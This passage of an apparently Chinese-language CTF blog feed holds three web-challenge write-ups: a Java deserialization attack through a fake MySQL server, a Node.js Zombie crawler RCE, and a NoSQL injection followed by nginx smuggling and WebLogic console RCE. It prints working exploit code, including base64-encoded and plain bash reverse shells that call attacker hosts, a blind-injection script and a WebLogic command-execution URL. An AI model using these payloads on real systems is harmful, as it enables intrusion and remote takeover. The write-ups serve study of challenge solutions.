class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.invocation.InfoInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.DatabaseInfo;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.Info;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        DatabaseInfo dataInfo = <span class="keyword">new</span> DatabaseInfo();</span><br><span class="line"></span><br><span class="line">        dataInfo.setHost(<span class="string">&quot;xxx.xxx.xxx.xxx&quot;</span>);</span><br><span class="line">        dataInfo.setPort(<span class="string">&quot;3306&quot;</span>);</span><br><span class="line"></span><br><span class="line">        dataInfo.setUsername(<span class="string">&quot;yso_CommonsCollections5_bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjEuMzcuMTAuMjU0LzEwMDAgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D&quot;</span>);</span><br><span class="line">        <span class="comment">//yso_CommonsCollections5_command，告诉伪造mysql服务用的那一条链</span></span><br><span class="line">        dataInfo.setPassword(<span class="string">&quot;123&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>);</span><br><span class="line">    <span class="comment">//触发反序列化的配置</span></span><br><span class="line">        </span><br><span class="line">        ClassLoader classLoader = dataInfo.getClass().getClassLoader();</span><br><span class="line">        Class[] interfaces = dataInfo.getClass().getInterfaces();</span><br><span class="line">        InfoInvocationHandler infoInvocationHandler = <span class="keyword">new</span> InfoInvocationHandler(dataInfo);</span><br><span class="line">        Info proxy = (Info) Proxy.newProxyInstance(classLoader, interfaces, infoInvocationHandler);</span><br><span class="line">        <span class="comment">//老三样</span></span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        objectOutputStream.writeObject(proxy);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(Base64.getEncoder().encode(baos.toByteArray())));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXN9AAAAAgAUamF2YS5pby5TZXJpYWxpemFibGUAHmdkdWZzLmNoYWxsZW5nZS53ZWIubW9kZWwuSW5mb3hyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyADRnZHVmcy5jaGFsbGVuZ2Uud2ViLmludm9jYXRpb24uSW5mb0ludm9jYXRpb25IYW5kbGVyY59H&#x2F;KdZhO8CAAFMAARpbmZvdAAgTGdkdWZzL2NoYWxsZW5nZS93ZWIvbW9kZWwvSW5mbzt4cHNyACZnZHVmcy5jaGFsbGVuZ2Uud2ViLm1vZGVsLkRhdGFiYXNlSW5mb19JEpYnRJPdAgAFTAAKY29ubmVjdGlvbnQAFUxqYXZhL3NxbC9Db25uZWN0aW9uO0wABGhvc3R0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgAJTAAEcG9ydHEAfgAJTAAIdXNlcm5hbWVxAH4ACXhwcHQADTEyMS4zNy4xMC4yNTR0AGUxMjMmYXV0b0Rlc2VyaWFsaXplPXRydWUmcXVlcnlJbnRlcmNlcHRvcnM9Y29tLm15c3FsLmNqLmpkYmMuaW50ZXJjZXB0b3JzLlNlcnZlclN0YXR1c0RpZmZJbnRlcmNlcHRvcnQABDMzMDZ0AJl5c29fQ29tbW9uc0NvbGxlY3Rpb25zNV9iYXNoJTIwLWMlMjAlN0JlY2hvJTJDWW1GemFDQXRhU0ElMkJKaUF2WkdWMkwzUmpjQzh4TWpFdU16Y3VNVEF1TWpVMEx6RXdNREFnTUQ0bU1RJTNEJTNEJTdEJTdDJTdCYmFzZTY0JTJDLWQlN0QlN0MlN0JiYXNoJTJDLWklN0Q&#x3D;</span><br></pre></td></tr></table></figure><p>作为cookie中的data值</p><p>执行，mysql服务端收到连接，发送相应payload</p><p><img src="/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_19-28-45.png"></p><p>成功反弹shell</p><p><img src="/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/Snipaste_2021-09-07_19-29-45.png"></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-源码审计&quot;&gt;&lt;a href=&quot;#0x01-源码审计&quot; class=&quot;headerlink&quot; title=&quot;0x01 源码审计&quot;&gt;&lt;/a&gt;0x01 源码审计&lt;/h3&gt;&lt;p&gt;主控制器下的路由&lt;code&gt;/hello&lt;/code&gt;，存在从外界输入获取序列化数据并进行反序列化的操作&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://123-prog.github.io/categories/CTF/"/>
    
    <category term="java web" scheme="https://123-prog.github.io/categories/CTF/java-web/"/>
    
    
    <category term="mysql恶意服务端读取客户端文件" scheme="https://123-prog.github.io/tags/mysql%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6/"/>
    
    <category term="java反序列化" scheme="https://123-prog.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="java动态代理知识" scheme="https://123-prog.github.io/tags/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>(2021祥云杯)cralwer_z</title>
    <link href="https://123-prog.github.io/2021/09/01/2021%E7%A5%A5%E4%BA%91%E6%9D%AF-cralwer-z/"/>
    <id>https://123-prog.github.io/2021/09/01/2021%E7%A5%A5%E4%BA%91%E6%9D%AF-cralwer-z/</id>
    <published>2021-09-01T14:24:37.000Z</published>
    <updated>2021-09-22T10:20:30.681Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>给了源码，正常注册，登录后进入路由<code>/user</code></p><p><code>/profile</code>用于展示和更改User信息，可以更改<code>User.bucket</code>，但这里是初步更改</p><a id="more"></a><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> User.update(&#123;</span><br><span class="line">            affiliation,</span><br><span class="line">            age,</span><br><span class="line">            personalBucket: bucket</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            where: &#123; <span class="attr">userId</span>: req.session.userId &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><p>这里并没有直接更改User的bucket信息，而是先存放在<code>personalBucket</code>中，后面更改的时候还要验证一下token</p><p>这里正常更改的话会有过滤，必须符合正则匹配</p><p><code>/^https:\/\/[a-f0-9]&#123;32&#125;\.oss-cn-beijing\.ichunqiu\.com\/$/</code></p><p>但可以通过其他方式，先更改personalBucket，这时候肯定是不符合正则的，程序就不会进行跳转更改，但我们可以自己拿token在verify路由下更改，主要是token要符合要求</p><p><code>/verify</code>可以说才是真正更改<code>bucket</code>的地方，看一下代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/verify&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; token &#125; = req.query;</span><br><span class="line">    <span class="keyword">if</span> (!token || <span class="keyword">typeof</span> (token) !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">&quot;Parameters error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">    <span class="keyword">const</span> result = <span class="keyword">await</span> Token.findOne(&#123;</span><br><span class="line">        token,</span><br><span class="line">        userId: req.session.userId,</span><br><span class="line">        valid: <span class="literal">true</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> Token.update(&#123;</span><br><span class="line">                valid: <span class="literal">false</span></span><br><span class="line">            &#125;, &#123;</span><br><span class="line">                where: &#123; <span class="attr">userId</span>: req.session.userId &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">await</span> User.update(&#123;</span><br><span class="line">                bucket: user.personalBucket</span><br><span class="line">            &#125;, &#123;</span><br><span class="line">                where: &#123; <span class="attr">userId</span>: req.session.userId &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">            <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; user, <span class="attr">message</span>: <span class="string">&quot;Successfully update your bucket from personal bucket!&quot;</span> &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            next(createError(<span class="number">500</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; user, <span class="attr">message</span>: <span class="string">&quot;Failed to update, check your token carefully&quot;</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>上面验证token应该是出现了非预期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const result &#x3D; await Token.findOne(&#123;</span><br><span class="line">        token,</span><br><span class="line">        userId: req.session.userId,</span><br><span class="line">        valid: true</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p><code>token</code>应该为<code>token:token</code></p><p>导致只要token存在就可以，<code>valid</code>就无关紧要了</p><p>所以现在可以不受限制更改bucket，步骤是，先提交符合要求的bucket拿到有效token，然后提交不符合要求的bucket，也就是目标bucket，这样User中的personalBucket就是目标bucket，然后访问<code>/user/verify?token=xxx</code>，就可以更改bucket了</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>利用zombie进行RCE</p><p>路由<code>/user/bucket</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">router.get(&#39;&#x2F;bucket&#39;, async (req, res) &#x3D;&gt; &#123;</span><br><span class="line">    const user &#x3D; await User.findByPk(req.session.userId);</span><br><span class="line">    if (&#x2F;^https:\&#x2F;\&#x2F;[a-f0-9]&#123;32&#125;\.oss-cn-beijing\.ichunqiu\.com\&#x2F;$&#x2F;.exec(user.bucket)) &#123;</span><br><span class="line">        return res.json(&#123; message: &quot;Sorry but our remote oss server is under maintenance&quot; &#125;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        &#x2F;&#x2F; Should be a private site for Admin</span><br><span class="line">        try &#123;</span><br><span class="line">            const page &#x3D; new Crawler(&#123;</span><br><span class="line">                userAgent: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.212 Safari&#x2F;537.36&#39;,</span><br><span class="line">                referrer: &#39;https:&#x2F;&#x2F;www.ichunqiu.com&#x2F;&#39;,</span><br><span class="line">                waitDuration: &#39;3s&#39;</span><br><span class="line">            &#125;);</span><br><span class="line">            await page.goto(user.bucket);</span><br><span class="line">            const html &#x3D; page.htmlContent;</span><br><span class="line">            const headers &#x3D; page.headers;</span><br><span class="line">            const cookies &#x3D; page.cookies;</span><br><span class="line">            await page.close();</span><br><span class="line"></span><br><span class="line">            return res.json(&#123; html, headers, cookies&#125;);</span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">            return res.json(&#123; err: &#39;Error visiting your bucket. &#39; &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>Crawler</code>爬虫使用<code>Zombie</code>实现，而这个模块是有漏洞的，参考</p><p><a href="https://ha.cker.in/index.php/Article/13563">https://ha.cker.in/index.php/Article/13563</a></p><p>更改bucket还要绕过一个简单的过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">static checkBucket(url) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            url &#x3D; new URL(url);</span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (url.protocol !&#x3D; &quot;http:&quot; &amp;&amp; url.protocol !&#x3D; &quot;https:&quot;) return false;</span><br><span class="line">        if (url.href.includes(&#39;oss-cn-beijing.ichunqiu.com&#39;) &#x3D;&#x3D;&#x3D; false) return false;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>用#绕过就可以了</p><p>提交bucket为<code>http://vps ip:port/hack.html#oss-cn-beijing.ichunqiu.com</code></p><p>在vps上开一个http服务，放置<code>hack.html</code></p><p>内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;c&#x3D;&#39;constructor&#39;;this[c][c](&quot;c&#x3D;&#39;constructor&#39;;require&#x3D;this[c][c](&#39;return process&#39;)().mainModule.require;var sync&#x3D;require(&#39;child_process&#39;).spawnSync; var ls &#x3D; sync(&#39;bash&#39;, [&#39;-c&#39;,&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;x 0&gt;&amp;1&#39;],);console.log(ls.output.toString());&quot;)()&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>再次访问<code>/user/bucket</code>即可拿到shell</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h3&gt;&lt;p&gt;给了源码，正常注册，登录后进入路由&lt;code&gt;/user&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/profile&lt;/code&gt;用于展示和更改User信息，可以更改&lt;code&gt;User.bucket&lt;/code&gt;，但这里是初步更改&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://123-prog.github.io/categories/CTF/"/>
    
    <category term="Nodejs" scheme="https://123-prog.github.io/categories/CTF/Nodejs/"/>
    
    
    <category term="js代码审计" scheme="https://123-prog.github.io/tags/js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="zombie RCE" scheme="https://123-prog.github.io/tags/zombie-RCE/"/>
    
  </entry>
  
  <entry>
    <title>(GKCTF 2021)hackme</title>
    <link href="https://123-prog.github.io/2021/08/18/GKCTF-2021-hackme/"/>
    <id>https://123-prog.github.io/2021/08/18/GKCTF-2021-hackme/</id>
    <published>2021-08-18T15:02:19.000Z</published>
    <updated>2021-09-22T10:19:08.544Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-nosql注入"><a href="#0x01-nosql注入" class="headerlink" title="0x01 nosql注入"></a>0x01 nosql注入</h3><p>前台提示nosql</p><p>利用重言式注入，发现存在过滤</p><a id="more"></a><p><img src="/2021/08/18/GKCTF-2021-hackme/Snipaste_2021-08-18_23-40-02.png"></p><p>由于是json数据，可以使用Unicode编码绕过</p><p><img src="/2021/08/18/GKCTF-2021-hackme/Snipaste_2021-08-18_23-41-16.png"></p><p>看来必须拿到admin的密码了，利用正则匹配进行盲注，首先匹配到密码长度为32</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&#123;&quot;\u0024\u0072\u0065\u0067\u0065\u0078&quot;:&quot;.&#123;33&#125;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>注入拿到密码，参考脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">alp = string.printable</span><br><span class="line">no = <span class="string">&#x27;.+*?|&amp;$#^&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.buuoj.cn:29004/login.php&#x27;</span></span><br><span class="line">pw = <span class="string">&#x27;&#x27;</span></span><br><span class="line">addHeaders = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> alp:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">not</span> <span class="keyword">in</span> no:</span><br><span class="line">            data = <span class="string">&#x27;&#x27;&#x27;&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&#123;&quot;\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078&quot;:&quot;^%s&quot;&#125;&#125;&#x27;&#x27;&#x27;</span> %(pw+x)</span><br><span class="line">            r = requests.post(url,headers=addHeaders,data=data)</span><br><span class="line">            <span class="comment">#print(r.text)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;登录了，但没完全登录&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                pw += x</span><br><span class="line">                print(pw)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>拿到密码为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">42276606202db06ad1f29ab6b4a1307f</span><br></pre></td></tr></table></figure><p>登录成功跳转到<code>/admin</code></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>登录完发现有个貌似可以读取文件的接口，但读取php文件没有显示源码，猜测是<code>php [filename]</code>，读取<code>/proc/self/cmdline</code>可以证明这一点</p><p>读取<code>/flag</code>会得到flag在内网，那么需要找到内网服务进行攻击</p><p>读取环境变量<code>/proc/self/environ</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USER&#x3D;nginxPWD&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;htmlSHLVL&#x3D;1HOME&#x3D;&#x2F;home&#x2F;nginx_&#x3D;&#x2F;usr&#x2F;bin&#x2F;php</span><br></pre></td></tr></table></figure><p>得到工作目录<code>/usr/local/nginx/html</code></p><p>而nginx配置文件在<code>/usr/local/nginx/conf/nginx.conf</code>， 读取配置文件如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application&#x2F;octet-stream;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    #keepalive_timeout  0;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        error_page 404 404.php;</span><br><span class="line">        root &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html;</span><br><span class="line">        index index.htm index.html index.php;</span><br><span class="line">        location ~ \.php$ &#123;</span><br><span class="line">           root           &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html;</span><br><span class="line">           fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">           fastcgi_index  index.php;</span><br><span class="line">           fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">           include        fastcgi_params;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">resolver 127.0.0.11 valid&#x3D;0s ipv6&#x3D;off;</span><br><span class="line">resolver_timeout 10s;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # weblogic</span><br><span class="line">    server &#123;</span><br><span class="line">listen       80;</span><br><span class="line">server_name  weblogic;</span><br><span class="line">location &#x2F; &#123;</span><br><span class="line">proxy_set_header Host $host;</span><br><span class="line">set $backend weblogic;</span><br><span class="line">proxy_pass http:&#x2F;&#x2F;$backend:7001;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到nginx反代，是个<code>weblogic</code></p><p>端口相同，nginx根据请求中的Host头部匹配对应server，如果匹配不到，默认第一个server，这里weblogic服务没有waf掉，改Host头就可以访问到</p><p><img src="/2021/08/18/GKCTF-2021-hackme/Snipaste_2021-08-26_16-27-44.png"></p><p>这里还有个漏洞，注意到nginx的版本为1.17.6，这个版本的error_page可以走私，也可以访问到weblogic，搜索引擎搜一下走私方法，其实就是利用前后端服务器对GET<strong>请求CL!=0情况处理的不一致</strong>，前端服务器接受CL!=0，后端服务器无视了</p><p>访问<code>/a</code>触发error_page，可以看到在请求体中的内容被当成另一个请求了，而且即使weblogic被前端服务器waf掉也可以利用</p><p><img src="/2021/08/18/GKCTF-2021-hackme/Snipaste_2021-08-26_16-32-00.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;a HTTP&#x2F;1.1</span><br><span class="line">Host: node4.buuoj.cn:25766</span><br><span class="line">Content-Length: 61</span><br><span class="line"></span><br><span class="line">GET &#x2F;console&#x2F;login&#x2F;LoginForm.jsp HTTP&#x2F;1.1</span><br><span class="line">Host: weblogic</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿到weblogic版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebLogic Server Version: 12.2.1.4.0</span><br></pre></td></tr></table></figure><p>利用有回显的exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsolejndi.portal?test_handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20&#x3D;%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20&#x3D;%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20&#x3D;%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20&#x3D;%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20&#x3D;%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20&#x3D;%20req.getHeader(%22cmd%22);String[]%20cmds%20&#x3D;%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]&#123;%22cmd.exe%22,%20%22&#x2F;c%22,%20cmd&#125;%20:%20new%20String[]&#123;%22&#x2F;bin&#x2F;sh%22,%20%22-c%22,%20cmd&#125;;if(cmd%20!&#x3D;%20null%20)&#123;%20String%20result%20&#x3D;%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20&#x3D;%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125;%20currentThread.interrupt();</span><br></pre></td></tr></table></figure><p>然后在请求头部添加<code>cmd: xxx</code>即可实现命令执行，而且有回显，执行/readflag读取拿到flag</p><p><img src="/2021/08/18/GKCTF-2021-hackme/Snipaste_2021-08-26_18-01-43.png"></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-nosql注入&quot;&gt;&lt;a href=&quot;#0x01-nosql注入&quot; class=&quot;headerlink&quot; title=&quot;0x01 nosql注入&quot;&gt;&lt;/a&gt;0x01 nosql注入&lt;/h3&gt;&lt;p&gt;前台提示nosql&lt;/p&gt;
&lt;p&gt;利用重言式注入，发现存在过滤&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://123-prog.github.io/categories/CTF/"/>
    
